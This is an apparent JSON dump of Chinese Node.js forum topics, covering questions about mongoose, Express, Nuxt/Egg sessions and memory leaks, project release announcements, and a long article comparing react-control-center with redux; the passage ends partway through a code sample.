class=\"markdown-text\"><p>这个问题困扰我很久了，一致没有想明白。\n这个表有100万的document，我需要遍历他，每次拿出来10条文档，对其进行1个比较耗时的处理，会利用callback返回，进行下10条文档的处理。\n直接使用如下代码，把所有100万数据都放入内存，然后利用async处理，我知道比较蠢，测试了一下，内存猛涨</p>\n<blockquote>\n<p>Blockquote\nMyModel.find({}, function (err, docs) { dosomething(docs,callback)});\nBlockquote</p>\n</blockquote>\n<p>这里请教一下大侠们，可否指点一下方法，使得可以遍历完成100万数据的处理，并且不会引起内存骤增，谢谢了！</p>\n</div>","title":"如何使用mongoose对一个100万+的mongodb的表进行遍历操作","last_reply_at":"2019-03-21T03:12:58.026Z","good":false,"top":false,"reply_count":16,"visit_count":33214,"create_at":"2013-03-25T17:12:16.919Z","author":{"loginname":"askie","avatar_url":"//gravatar.com/avatar/f95eba0fbfdbaa152f4bf59fdc395ae8?size=48"}},{"id":"53b93bab1b009b31532ef934","author_id":"50f7a0a9df9e9fcc5889a1b0","content":"<div class=\"markdown-text\"><p>要安全的, 要用gmail.\n封这么厉害…</p>\n</div>","title":"有靠谱的VPN推荐吗?","last_reply_at":"2019-03-21T01:57:41.783Z","good":false,"top":false,"reply_count":39,"visit_count":70596,"create_at":"2014-07-06T12:06:03.451Z","author":{"loginname":"ronincn","avatar_url":"//gravatar.com/avatar/0582e15ee13a3fef9d78dac6f0c71575?size=48"}},{"id":"5c8f7aac7ce0df37324297af","author_id":"597409048f0313ff0d08d701","tab":"ask","content":"<div class=\"markdown-text\"><p>感觉可以浏览器直连,断点调试node项目,非常方便啊</p>\n</div>","title":"有人在测试环境开启--inspect模式的吗","last_reply_at":"2019-03-20T09:54:01.980Z","good":false,"top":false,"reply_count":3,"visit_count":431,"create_at":"2019-03-18T11:02:04.915Z","author":{"loginname":"Liaozhenting","avatar_url":"https://avatars0.githubusercontent.com/u/20339251?v=4&s=120"}},{"id":"5c9122ff8a587f26b426c8df","author_id":"5c9120fa8a587f26b426c8d9","tab":"ask","content":"<div class=\"markdown-text\"><p>sub-app在init中lazyrouter时会通过this._router.use(middleware.init(this))设置sub-app的req和res的原型指向sub-app的request和response。代码：    setPrototypeOf(req, app.request) setPrototypeOf(res, app.response)，\n但用app.use（sub-app）进行挂载时会执行<br>\nrouter.use(path, function mounted_app(req, res, next) {\nvar orig = req.app;\nfn.handle(req, res, function (err) {\nsetPrototypeOf(req, orig.request)\nsetPrototypeOf(res, orig.response)\nnext(err);\n});\n});\n\t这里是不是把sub-app的req和res重新挂在到app的request和response上面了呢？如果是的目的是什么？</p>\n</div>","title":"关于express sub-app挂载源码部分问题","last_reply_at":"2019-03-20T04:25:58.285Z","good":false,"top":false,"reply_count":1,"visit_count":363,"create_at":"2019-03-19T17:12:31.973Z","author":{"loginname":"2015308200114dujiawei","avatar_url":"https://avatars3.githubusercontent.com/u/31696279?v=4&s=120"}},{"id":"5c90507096558e26e1b66b57","author_id":"580f6fcab37ee8fb339787ea","tab":"ask","content":"<div class=\"markdown-text\"><p>使用nuxt跟eggjs做的服务端渲染，目前遇到问题了，在about页面刷新，eggjs的中间件拿不到用户的session了，哪位大佬帮看看，不知道是nuxt这边的问题还是eggjs这边的问题</p>\n<p><a href=\"https://github.com/lzq920/nuxt-eggjs-ssr-template.git\">实例地址</a></p>\n<p>中间件定义</p>\n<pre class=\"prettyprint language-javascript\"><code>const { Nuxt, Builder } = require(&quot;nuxt&quot;);\nlet config = require(&quot;..&#x2F;..&#x2F;nuxt.config&quot;);\nmodule.exports = (options, app) =&gt; {\n  const nuxtRender = new Nuxt(config);\n  let isDev = process.env.NODE_ENV !== &quot;production&quot;;\n  if (isDev) {\n    new Builder(nuxtRender).build();\n  }\n  return async function(ctx, next) {\n    let flag = false;\n    let routerArr = [];\n    if (!flag) {\n      routerArr = app.router.stack.map(el =&gt; el.path);\n      flag = true;\n    }\n    if (routerArr.some(el =&gt; el === ctx.path)) {\n      return await next();\n    }\n    ctx.status = 200;\n    ctx.req.session = ctx.session;\n    const { res, req } = ctx;\n    return new Promise((resolve, reject) =&gt; {\n      ctx.res.on(&quot;close&quot;, resolve);\n      ctx.res.on(&quot;finish&quot;, resolve);\n      nuxtRender.render(req, res, promise =&gt; {\n        promise.then(resolve).catch(reject);\n      });\n    });\n  };\n};\n\n</code></pre><p>about页面请求</p>\n<pre class=\"prettyprint language-javascript\"><code>export default {\n  asyncData({ params }) {\n    return axios.get(&quot;http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;api&#x2F;info&quot;).then(res =&gt; {\n      return { info: res.data };\n    });\n  }\n};\n</code></pre><p>nuxtServerInit定义</p>\n<pre class=\"prettyprint language-javascript\"><code>export const state = () =&gt; ({\n  user: null\n});\n\nexport const mutations = {\n  setUser(state, data) {\n    state.user = data;\n  }\n};\nexport const actions = {\n  nuxtServerInit({ commit }, { req }) {\n    if (req.session.user) {\n      console.log(&quot;client&quot;, req.session.user);\n      commit(&quot;setUser&quot;, req.session.user);\n    }\n  }\n};\n</code></pre></div>","title":"使用nuxt跟eggjs做的服务端渲染，目前遇到问题了，在about页面刷新，eggjs的中间件拿不到用户的session了，哪位大佬帮看看","last_reply_at":"2019-03-20T02:43:11.603Z","good":false,"top":false,"reply_count":13,"visit_count":699,"create_at":"2019-03-19T02:14:08.258Z","author":{"loginname":"lzq920","avatar_url":"https://avatars0.githubusercontent.com/u/37999725?v=4&s=120"}},{"id":"5c908c8d96558e26e1b66e06","author_id":"5934bb555b07c1b24afa067e","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/Fi1GE3MmJAEzcRS6QE7fvUUwvKjC\" alt=\"image.png\">\n发发现nodejs的进程的内存逐渐升高，并产生的大量system/JSArrayBufferData，Distance非常大，如图所示，请问这些对象如何分析呢？</p>\n</div>","title":"内存泄漏排查","last_reply_at":"2019-03-20T02:28:02.198Z","good":false,"top":false,"reply_count":5,"visit_count":642,"create_at":"2019-03-19T06:30:37.885Z","author":{"loginname":"zhengboah","avatar_url":"https://avatars3.githubusercontent.com/u/17705410?v=4&s=120"}},{"id":"5c91a0bc96558e26e1b67722","author_id":"54bc7fde0049cbcc5994c51f","tab":"share","content":"<div class=\"markdown-text\"><p>多多客（doodooke）是一款支持微信，百度，支付宝小程序的第三方SaaS平台。</p>\n<p><strong>本次重要更新：</strong></p>\n<ol>\n<li>开源diy可视化拖拉拽</li>\n<li>开源taro三端合一小程序</li>\n</ol>\n<p><strong>3.0新特性</strong></p>\n<ol>\n<li>支持migrations，可以快速的创建和修改表</li>\n<li>支持rewrite，可以将请求转发到修改过的接口</li>\n<li>支持view逻辑钩子，可以扩展vue逻辑</li>\n<li>支持view视图钩子，可以扩展vue视图</li>\n<li>支持cluster，可以启动多个项目</li>\n<li>支持本地调试，可以将生产环境的请求转发或复制到本地</li>\n<li>支持bin命令，可以快速的处理migration等</li>\n</ol>\n<p>详情查看<a href=\"https://gitee.com/doodooke/doodoo/releases/3.0.0-alpha.3\">发布日志</a></p>\n<p><strong>仓库</strong></p>\n<ul>\n<li>gitee <a href=\"https://gitee.com/doodooke/doodoo\">https://gitee.com/doodooke/doodoo</a></li>\n<li>github <a href=\"https://github.com/doodooke/doodooke\">https://github.com/doodooke/doodooke</a></li>\n</ul>\n</div>","title":"多多客（doodooke）小程序SaaS平台发布 3.0.0-alpha.3，支持微信，百度，支付宝","last_reply_at":"2019-03-20T02:09:00.553Z","good":false,"top":false,"reply_count":0,"visit_count":578,"create_at":"2019-03-20T02:09:00.553Z","author":{"loginname":"einsqing","avatar_url":"https://avatars3.githubusercontent.com/u/7685948?v=4&s=120"}},{"id":"5c9051248a587f26b426bf4b","author_id":"560b3a2848055cd15e2c8957","tab":"share","content":"<div class=\"markdown-text\"><p>NutzWk 5.2.0 版本已发布，演示地址： <a href=\"https://nutzwk.wizzer.cn\">https://nutzwk.wizzer.cn</a></p>\n<p>源码Github：<a href=\"https://github.com/Wizzercn/NutzWk\">https://github.com/Wizzercn/NutzWk</a>\n码云Gitee：<a href=\"https://gitee.com/wizzer/NutzWk\">https://gitee.com/wizzer/NutzWk</a></p>\n<p>后端技术架构：nutzboot + dubbo + sentinel + redis + zookeeper\n前端技术架构：vue.js + element.js</p>\n<p>简述：\n自 2018.03.20 发布 v5.0.1 第一个微服务分布式版本、2018.11.13 发布 v5.1.0 第一个Vue版本，一年来 NutzWk 根据项目实践及业务需要，逐步完善功能、修复bug、添加新特性，朝着“快速开发、功能丰富、扩展性强、性能优越”，在力所能及的情况下，最大限度的提高Web开发人员的生产力的目标继续前进。</p>\n<p>随着项目越做越多，运维成了繁重的工作，本次 v5.2.0 版本主要带来了可在线上传jar包、编辑配置文件、关闭实例进程、启动新实例进程、动态修改日志等级、查看服务器资源占用情况等功能，支持分布式部署。详见：<a href=\"https://github.com/Wizzercn/NutzWk/releases\">发行注记</a>。</p>\n<p><img src=\"https://oscimg.oschina.net/oscnet/daba7cc0428f1cb0a626f9e7d70db68863a.jpg\" alt=\"01\"></p>\n<p><img src=\"https://oscimg.oschina.net/oscnet/31af6228e53ee05197caeebb4a1fc683c49.jpg\" alt=\"02\"></p>\n<p><img src=\"https://oscimg.oschina.net/oscnet/0b3dd5e4fe243cb160a7669e41b849e9545.jpg\" alt=\"03\"></p>\n<p><img src=\"https://oscimg.oschina.net/oscnet/ea00c1ef55fb807bc214e04d1e92f76f468.jpg\" alt=\"04\"></p>\n</div>","title":"NutzWk 5.2.0(一周年) 版本，运维中心重磅发布","last_reply_at":"2019-03-19T14:06:39.874Z","good":false,"top":false,"reply_count":1,"visit_count":559,"create_at":"2019-03-19T02:17:08.282Z","author":{"loginname":"Wizzercn","avatar_url":"https://avatars0.githubusercontent.com/u/2408114?v=4&s=120"}},{"id":"5c8cc8d37ce0df3732428a21","author_id":"5c381e903898674067a7e050","tab":"share","content":"<div class=\"markdown-text\"><p>#好利来公司官网</p>\n<h5></h5>\n<h3>代码目录</h3>\n<pre class=\"prettyprint\"><code>+-- public&#x2F;                                    ---公共样式\n+-- routes&#x2F;                               ---每个页面的路由模块\n+-- view&#x2F;                                 ---静态html\n+-- fail&#x2F;                                   ---入口文件\n+-- app.js&#x2F;\t\t\t\t\t\t\t        ---首页入\n+-- model&#x2F;\t\t\t\t\t\t            ---公共方法\n</code></pre><p>#程序安装方法</p>\n<pre class=\"prettyprint\"><code>1.确保电脑已经安装了NodeJS环境，运行版本尽量保持最新（V8以上吧），选择本地的一个路径，然后运行命令\n$ git clone https:&#x2F;&#x2F;github.com&#x2F;dezhizhang&#x2F;haolilaicompany.git\n2.进入程序的主目录（包含app.js的那个文件夹）运行命令：npm install，系统就会自动安装该程序的依赖包；\n3.启动数据库mongod --dbpath 路径地址\n4.在以上的步骤都执行完成且正确的情况下，就可以在程序主目录下面（有app.js的那个目录）,运行命令\n$ node app.js\n</code></pre><p>GIthub源码：<a href=\"https://github.com/dezhizhang/haolilaicompany\">https://github.com/dezhizhang/haolilaicompany</a>\n<img src=\"https://github.com/dezhizhang/haolilaicompany/blob/master/public/upload/17.png\" alt=\"Image text\">\n<img src=\"https://github.com/dezhizhang/haolilaicompany/blob/master/public/upload/22.png\" alt=\"Image text\">\n<img src=\"https://github.com/dezhizhang/haolilaicompany/blob/master/public/upload/9.png\" alt=\"Image text\">\n<img src=\"https://github.com/dezhizhang/haolilaicompany/blob/master/public/upload/10.png\" alt=\"Image text\">\n<img src=\"https://github.com/dezhizhang/haolilaicompany/blob/master/public/upload/12.png\" alt=\"Image text\"></p>\n</div>","title":"koa2+mongodb开发大型前后台网站","last_reply_at":"2019-03-19T12:25:30.218Z","good":false,"top":false,"reply_count":3,"visit_count":925,"create_at":"2019-03-16T09:58:43.796Z","author":{"loginname":"dezhizhang","avatar_url":"https://avatars3.githubusercontent.com/u/28954583?v=4&s=120"}},{"id":"5c84f6857ce0df3732426a03","author_id":"550973933135610a365b01fa","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/Fh0uwdXZ1tsy6Cjn8jMJTLbyauC6\" alt=\"cc-vs-redux.jpg\"></p>\n<h3>没有对比就没有伤害，<code>react-control-center</code> vs <code>redux</code></h3>\n<p>以下会把<code>react-control-center</code> 简称为<code>cc</code>哦</p>\n<table>\n<thead>\n<tr>\n<th>对比项/项目</th>\n<th>redux</th>\n<th>react-control-center</th>\n<th>结果</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>git start</td>\n<td>43k</td>\n<td>43</td>\n<td>没错，少了一个k，彻底完败</td>\n</tr>\n<tr>\n<td>开源时间</td>\n<td>2015年</td>\n<td>2018年12月</td>\n<td>早出生4年</td>\n</tr>\n<tr>\n<td>作者</td>\n<td>Dan Abramov</td>\n<td>无名小辈</td>\n<td>惨无人道的完败</td>\n</tr>\n<tr>\n<td>架构实现</td>\n<td>flux</td>\n<td>flux</td>\n<td>平手</td>\n</tr>\n<tr>\n<td>插件生态</td>\n<td>redux-dev-tool等</td>\n<td>无，未来提供</td>\n<td>cc需要时间追赶？</td>\n</tr>\n<tr>\n<td>中间件机制</td>\n<td>提供</td>\n<td>提供</td>\n<td>平手</td>\n</tr>\n<tr>\n<td>可对接的UI框架</td>\n<td>react、vue、angular或其他</td>\n<td>专注于react</td>\n<td>redux可以用他的基础库桥接其他UI框架，cc仅仅专注于react，此项无结果</td>\n</tr>\n<tr>\n<td>代码组织</td>\n<td>严格按照action、reducer的思路写出很多模板代码，所以无数redux wrapper出来了，让你更优雅的写redux，写副作用</td>\n<td>天生内置一系列强悍的技术api，reducer和action合为一体，甚至你都不需要感知到reducer的存在</td>\n<td>不做评论，请各位看官看完在下结论</td>\n</tr>\n</tbody>\n</table>\n<p>各位看官看到这里，肯定感慨良多，如果借用三体里的比喻，<code>cc</code>是地球文明的话，<code>redux</code>就是三体文明，或者再提升到哥者文明…<br>\n简直就是托马斯回旋翻滚360度转体720度然后脸部着地的完败，但？真的是这样吗，还请你此刻不要把鼠标挪到关闭按钮上，先把下文读完，看看<code>cc</code>用什么来挑战<code>redux</code>,甚至整个<code>redux</code>家族。</p>\n<hr>\n<h3>回顾下，<code>redux</code>给予了我们什么</h3>\n<h4>一个全局统一的状态树</h4>\n<p><code>redux</code>内部维护着一个<code>big object</code>，官方称之为<code>state tree</code>或者<code>store</code>，这一棵参天大树携带的数据作为整个单页面应用的数据源，利用内置的中间件功能，结合提供的<code>redux-dev-tool</code>以及<code>immutableJs</code>提供的数据不可变特性，每次修改数据都会生成一个新的<code>state</code>记录在<code>redux-dev-tool</code>里，让我们在开发模式下实现了状态可追溯。</p>\n<h4>规范的数据修改方式</h4>\n<p><code>redux</code>世界里约束了我们一定要通过派发一个<code>action</code>对象去修改<code>state</code>,生成<code>action</code>的函数称之为<code>actionCreateor</code>,修改<code>state</code>的函数称为<code>reducer</code>。</p>\n<blockquote>\n<p>题外话，关于<code>reducer</code>为什么称为<code>reducer</code>,我们引用下官网的原话：<br>\nIt’s called a reducer because it’s the type of function you would pass to Array.prototype.reduce(reducer, ?initialValue)<br>\n翻译出来大概就是：之所以将函数叫为reducer，是因为这种函数与被传入 Array.prototype.reduce(reducer, ?initialValue)里的回调函数<code>reducer</code>属于相同的类型。</p>\n</blockquote>\n<p>所以不管命名怎样，我们已经达成了共识，<code>action</code>就是一个用<code>type</code>描述要使用什么<code>reducer</code>函数以及用<code>payload</code>描述传递什么数据给<code>reducer</code>函数的普通<code>json</code>对象，<code>reducer</code>函数负责把最新的状态传递给<code>store</code>,<code>store</code>负责把发生了变化的状态下发到各个关心这些变化的子组件上。<br>\n整理一下，三大核心概念<code>action</code>、<code>reducer</code>、<code>store</code>,会有如下关系</p>\n<pre class=\"prettyprint\"><code>action (type,paylaod)\n  |______reducer(new state)\n            |______store\n                     |______render UI\n</code></pre><h3><code>cc</code>给予了我们什么</h3>\n<h4>一个模块化的的单一状态树</h4>\n<p><code>cc</code>一开始就推荐用户按模块切分自己的状态，然后启动时将这些模块话的<code>state</code>交给<code>cc</code>,<code>cc</code>将它们合并出一个单一的状态树，当然针对这一点很多<code>redux wrapper</code>也做了改进，如<code>dva</code>提供了<code>namespace</code>让你的转态拥有自己的命名空间。</p>\n<h4>更灵活的修改数据的api</h4>\n<p>注册到<code>cc</code>里<code>cc class</code>，如果你仅仅像传统的方式一样使用<code>setState</code>去改变数据来驱动视图渲染，那么看起来和普通<code>react class</code>真的是没有什么不同之处的，但是<code>cc class</code>自生上下文携带了几个很重要的信息，即<code>module</code>表示属于哪个模块,<code>sharedStateKeys</code>表示共享这个模块的哪些<code>key</code>的状态，既然是共享，就意味着当前<code>cc实例</code>改变了这个<code>key</code>的值，<code>cc</code>会把它广播到其他同样属于这个模块并共享这个<code>key</code>的<code>cc class</code>的实例，当然了，其他<code>cc实例</code>改变了这个<code>key</code>的值也会广播到当前实例并触发其渲染，<code>cc</code>内核的工作流程大致如下图所示：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/10/16965e5dec6b197e?w=1672&amp;h=1024&amp;f=png&amp;s=205701\" alt>\n可以看到此种模式下，<code>cc</code>彻底解决了<code>redux</code>里几个问题</p>\n<ul>\n<li><code>action</code>命名膨胀，<code>redux</code>里提倡的<code>reducer</code>是纯函数，每次返回的一定是一个全新的<code>state</code>,因为<code>redux</code>需要只是利用浅比较的方式知道状态有没有发生变化，所以我们通常会看到如下代码</li>\n</ul>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F; code in counter-actions.js\nexport function inc(){\n    return {type:&#x27;INC_COUNT&#x27;}\n}\nexport function dec(){\n    return {type:&#x27;INC_COUNT&#x27;}\n}\n\n&#x2F;&#x2F; code in counter-reducer.js\nexport default function reducer(initState, action){\n    const {type, payload} = action;\n    switch(type){\n        case &#x27;INC_COUNT&#x27;:\n            return {...state, count:initState.count+1};\n        case &#x27;DEC_COUNT&#x27;:\n            return {...state, count:initState.count-1};\n        default:\n            return initState;\n    }\n}\n</code></pre><p><code>cc</code>是接管了<code>react</code>最原始的<code>setState</code>函数做扩展，就像<code>react.setState(partialState, callback)</code>描述的一样，所以对于<code>cc</code>来说，真的只需要一个片段<code>state</code>就够了，<code>cc</code>通过分析用户提交的<code>partialState</code>,足以知道用户的此次操作改变了哪些状态，所以我们的<code>Counter</code>可以写为</p>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F;也可以简写为@cc.r(&#x27;Counter&#x27;,{m:&#x27;counter&#x27;, s:&#x27;*&#x27;})\n@cc.register(&#x27;Counter&#x27;,{module:&#x27;counter&#x27;, sharedStateKeys:&#x27;*&#x27;})\nclass Counter extends Component{\n    inc = ()=&gt; { this.setState({count:this.state+1}) }\n    dec = ()=&gt; { this.setState({count:this.state-1}) }\n    render(){\n        const {count} = this.state;\n        return (\n            &lt;div&gt;\n                &lt;button onClick={this.inc}&gt;inc&lt;&#x2F;button&gt;\n                &lt;button&gt;dec&lt;&#x2F;button&gt;\n                {count}\n            &lt;&#x2F;div&gt;\n        );\n    }\n}\n</code></pre><p>如果你的App实例化了多个<code>Counter</code>,他们将共享<code>count</code>值</p>\n<pre class=\"prettyprint\"><code>render(){\n    return (\n        &lt;div&gt;\n            &lt;Counter &#x2F;&gt;\n            &lt;Counter &#x2F;&gt;\n            &lt;Counter &#x2F;&gt;\n        &lt;&#x2F;div&gt;\n    );\n}\n</code></pre><p>实际上你可能发现一个问题，<code>redux</code>严格约定的<code>action type</code>可以用来追溯是什么动作改变了<code>state</code>啊！可是真的想想，仅靠<code>action type</code>能够知道什么动作改变了<code>state</code>就够了吗？在一个大型的负责项目里，通常你是需要知道具体到那个UI改变了状态，但是你会发现有很多UI都会派发同一个<code>action type</code>,这要怎么追，为每一个动作都命名一个不一样的<code>action type</code>但是其实操作的数据和修改的动作是一摸一样的?<br>\n在<code>cc</code>里你只要为组件标记一个<code>ccKey</code>就够了，你可以写一个简答的中间件函数打印,cc会告诉你此次修改的所有细节，后期提供的<code>cc-dev-tool</code>会结合<code>immutableJs</code>来构建一个可追溯的状态历史</p>\n<pre class=\"prettyprint\"><code>cc.startup(\n    {\n        &#x2F;&#x2F;...\n        middlewares: [\n            function myMiddleware1(context, next){\n                &#x2F;&#x2F;ccKey, fnName, module, calledBy, state等\n                console.log(context);\n                next();\n            }\n        ]\n    }\n)\n</code></pre><ul>\n<li>副作用代码难以编写和复用，尽管有<code>redux-saga</code>之类的来解决此类问题，可是我们重新审视一下<code>cc</code>的设计，天生的对副作用的代码书写是友好的。\n然后抛弃<code>setState</code>,使用<code>dispatch</code>来改变状态，在<code>cc class</code>内部可以使用<code>this.$$dispatch(action:Action|String, payload?:any)</code>来完成，注意一点哦，因为上面说到了，对于<code>cc</code>来说只需要提交一个<code>partialState</code>就够了，所以实际上<code>actionCreator</code>和<code>reducer</code>被精简为一体了，在<code>cc</code>里<code>reducer</code>函数负责接到状态，然后返回一个新的<code>partialState</code>就够了。</li>\n</ul>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F;code in Counter class\ninc() =&gt; this.$$dispatch({type:&#x27;inc&#x27;});\ndec()=&gt; this.$$dispatch(&#x27;dec&#x27;);\n\n&#x2F;&#x2F;我们启动cc配置的reducer如下\ncc.startup({\n    &#x2F;&#x2F;...\n    reducer:{\n        inc({state, payload, dispatch}){\n            return {count: state.count+1};\n        },\n        dec({state}){\n            return {count: state.count+1};\n        }\n    }\n})\n</code></pre><p>说好的副作用书写友好在哪里呢？我们留意的可以看到<code>reducer</code>函数参数列表里还解构出其他东东，比如<code>dispatch</code>,来来来，让我们提个需求，新增一个按钮，点击这个按钮时，先加10，然后过2秒钟自动减5，然后再过3秒直接变成100，因为在cc的<code>recuder</code>里是不强制一定要返回一个新的<code>partialState</code>的，不返回只是不会触发渲染而已，但是解构出来的<code>dispatch</code>是一个组合复用其他<code>reducer</code>函数的哦，让我们清爽的实现这个需求。</p>\n<pre class=\"prettyprint\"><code>async function sleep(ms=1000){\n    return new Promise((resolve)=&gt;setTimeout(resolve, ms));\n}\n\n&#x2F;&#x2F;reducer修改如下\nreducer:{\n    inc({state, payload:count=1, dispatch, effect}){\n        return {count: state.count+count};\n    },\n    dec({state, payload:count=1}){\n        return {count: state.count-count};\n    },\n    async funnyInc({await}){\n        await dispatch(&#x27;inc&#x27;, 10);\n        await sleep(5);\n        await dispatch(&#x27;dec&#x27;, 5);\n    }\n}\n\n&#x2F;&#x2F;Counter里\nfunnyInc() =&gt; this.$$dispatch(&#x27;funnyInc&#x27;);\n\n&#x2F;&#x2F;render里\n&lt;button onClick={this.funnyInc}&gt;funnyInc1&lt;&#x2F;button&gt;\n\n&#x2F;&#x2F;甚至你可以使用$$domDispatch,来减少这样没有必要的函数定义\n&lt;button data-cct=&quot;funnyInc&quot; onClick={this.$$domDispatch}&gt;funnyInc1&lt;&#x2F;button&gt;\n</code></pre><p>现在你可以放心喝一口茶了，看到界面上会如你所想的工作，组合现有的<code>reducer</code>函数是一件多么轻松惬意的事情，注意哦<code>dispatch</code>返回一个<code>Promise</code>，某些场景时机你可能不需要<code>await</code>，这个就取决于具体业务了。<br>\n我们进一步思考下中间件函数打印出的东西里有<code>ccKey, fnName, module, calledBy, state</code>等，以及图中提到的<code>effect</code>，我们所有做的事情只是返回一个新的<code>partialState</code>，一定需要走<code>dispatch</code>和<code>reducer</code>这种模式吗？当然是否，<code>cc</code>提供<code>effect(moduleName:String, userFunction:Function, ...args)</code>就是让你直接调用自己的业务函数，返回一个新的<code>partialState</code>就好了，那么我们<code>funnyInc</code>可以改写为：</p>\n<pre class=\"prettyprint\"><code>async function sleep(ms=1000){\n    return new Promise((resolve)=&gt;setTimeout(resolve, ms));\n}\nasync function inc(prevCount, count=1){\n    return {count: prevCount+1};\n}\nasync function dec(prevCount, dec=1){\n     return {count: prevCount-1};\n}\nasync function myFunnyInc({effect, dispatch, state}, count){\n    await effect(&#x27;count&#x27;, inc, state.count, 10);\n    await sleep(5);\n    await effect(&#x27;count&#x27;, dec, state.count, 5);\n}\n\n&#x2F;&#x2F;Counter里, 注意此处用的$$xeffect，用户自定义的函数参数列表第一位会是cc注入的ExecutionObject,里面可以解构出相关其他句柄和数据\nfunnyInc() =&gt; this.$$xeffect(&#x27;count&#x27;, myFunnyInc);\n\n&lt;button onClick={this.funnyInc}&gt;funnyInc1&lt;&#x2F;button&gt;\n</code></pre><p>如果用户留意的话，发现上面<code>$$xeffect</code>调用的用户自定义函数的第一位参数里也解构出了<code>dispatch</code>,如果你再往上看，会发现<code>reducer</code>方法里也解构出了<code>effect</code>、<code>xeffect</code>，如你想所想，他们可以混合使用，你可以在<code>reducer</code>里用<code>effect</code>，也可以在<code>effect</code>调用的函数使用<code>dispatch</code>，能够完美的工作起来，事实上你可能再想…这样穿插的调用，还怎么保证状态可追踪？你可能忘了，任何调用<code>cc</code>都会知道上下文，由那个<code>cc实例</code>最初发起调用，使用了什么方式<code>setState</code>、<code>dispatch</code>、<code>effect</code>或者其他，如果是<code>dispatch</code>，<code>type</code>是什么，如果是<code>effect</code>,调用的自定义函数名字是什么等，真正让你从源头知道是从那里开始，走了一个怎样的流程，改变了那些状态，是不是够你追溯了呢？</p>\n<ul>\n<li>更加优雅的组件间通信，让我们仔细想想，<code>redux</code>真正的算是解决了组件间通信吗？基于状态去做？让我们看看<code>cc</code>里是怎么实现的</li>\n</ul>\n<pre class=\"prettyprint\"><code>@cc.r(&#x27;Counter&#x27;,{m:&#x27;counter&#x27;, s:&#x27;*&#x27;})\nclass Counter extends Component{\n    componentDidMount(){\n        const id = this.props.id;\n        this.$$on(&#x27;cool&#x27;,(p1, p2)=&gt;{\n            &#x2F;&#x2F;做你任意想做的事吧\n            alert(p1+p2+id);\n        })\n        this.$$onIdentity(&#x27;cool&#x27;, id, (p1, p2)=&gt;{\n            alert(p1+p2+id);\n        })\n    }\n}\n\n&#x2F;&#x2F;App render里\n      &lt;div&gt;\n         &lt;button onClick={()=&gt;this.$$emit(&#x27;cool&#x27;,&#x27;normal &#x27;, &#x27;emit&#x27;)}&gt;emit&lt;&#x2F;button&gt;\n        &lt;button onClick={()=&gt;this.$$emitIdentity(&#x27;cool&#x27;, &#x27;1&#x27; ,&#x27;identity &#x27;, &#x27;emit&#x27;)}&gt;emitIdentity&lt;&#x2F;button&gt;\n        &lt;Counter id=&quot;1&quot;&#x2F;&gt;\n        &lt;Counter id=&quot;2&quot;&#x2F;&gt;\n        &lt;Counter id=&quot;3&quot;&#x2F;&gt;\n        &lt;Counter id=&quot;4&quot;&#x2F;&gt;\n        &lt;Counter id=&quot;5&quot;&#x2F;&gt;\n      &lt;&#x2F;div&gt;\n</code></pre><p>当你点击emit按钮时，5个<code>&lt;Counter/&gt;</code>都会收到事件然后弹出显示，打你点击emitIdentity按钮时，只有id为1的那个<code>&lt;Counter/&gt;</code>会弹出提示，是不是更直白和优雅？<br>\n事实上可能有细心的读者注意到每次组件<code>componentDidMount</code>都会触发<code>$$on</code>，会不会造成内存泄露，需不需要人工<code>off</code>？尽管<code>cc</code>提供了api让你可以使用<code>this.$$off(eventName:String)</code>，但是这里<code>cc</code>在这里已经在每次组件卸载时<code>off</code>掉这写监听了，不需要你再去<code>componentWillUnmount</code>里实现了。</p>\n<ul>\n<li>计算属性呢？<code>redux</code>在<code>mapStateProps</code>里可以让用户重新计算注入到组件里的值，让我们看看<code>cc</code>怎么样更直白的实现</li>\n</ul>\n<pre class=\"prettyprint\"><code>@cc.r(&#x27;Counter&#x27;,{m:&#x27;counter&#x27;, s:&#x27;*&#x27;})\nclass Foo extends Component{\n    $$computed(){\n        return {\n            count(count){\n                return count*100;\n            }\n        }\n    }\n    render(){\n        const {count} = this.$$refComputed;\n        return &lt;div&gt;scaled count {count}&lt;&#x2F;div&gt;\n    }\n}\n</code></pre><p>实际上你还可在模块里定义<code>computed</code>，这样计算出来的值是这个<code>module</code>下的所有组件都可以获取到的了，不过在<code>render</code>里是通过<code>this.$$moduleComputed</code>取到。</p>\n<pre class=\"prettyprint\"><code>cc.startup(){\n    &#x2F;&#x2F;...\n    computed:{\n        counter:{&#x2F;&#x2F;为counter模块的count定义计算函数\n            count(count){\n                return count*100;\n            }\n        }\n    }\n}\n</code></pre><p>注意，计算函数只有在对应的<code>key</code>值发生变化时才重新触发计算，否则值是一直被缓存住的。</p>\n<h4>一切从state获取是不是违背原则</h4>\n<p>读者可能已经注意到了，在<code>cc</code>里，<code>store</code>的数据都是注入在<code>state</code>里了，实际上<code>cc实例</code>的state由<code>cc</code>通过<code>register</code>时标记的<code>module</code>、<code>sharedStateKeys</code>、<code>globalStateKeys</code>的值合成出来的，所有<code>cc</code>组件都天生的能够观察<code>cc</code>内置模块<code>$$global</code>的状态变化，所有<code>cc</code>组件如果不设定<code>module</code>都会默认为属于<code>cc</code>的内置模块<code>$$default</code>，如下图所示，告诉你<code>cc实例</code>的<code>state</code>怎么产生的</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/10/1696792460447c10?w=1598&amp;h=990&amp;f=png&amp;s=184585\" alt>\n假设我们的<code>counter</code>模块和<code>$$global</code>模块的<code>state</code>现在如下</p>\n<pre class=\"prettyprint\"><code>cc.startup({\n    isModuleModel:true,\n    store:{\n        counter:{\n            count:8,\n        }\n        $$global:{\n            info:&#x27;i am global&#x27;\n        }\n    }\n})\n</code></pre><p>我们新建一个<code>Bar</code></p>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F;等同于写cc.register(&#x27;Bar&#x27;,{m:&#x27;counter&#x27;, sharedStateKeys:&#x27;*&#x27;, globalStateKeys:&#x27;*&#x27;})\n@cc.r(&#x27;Bar&#x27;,{m:&#x27;counter&#x27;, s:&#x27;*&#x27;, g:&#x27;*&#x27;})\nclass Foo extends Component{\n    render(){\n       console.log(this.state);&#x2F;&#x2F; 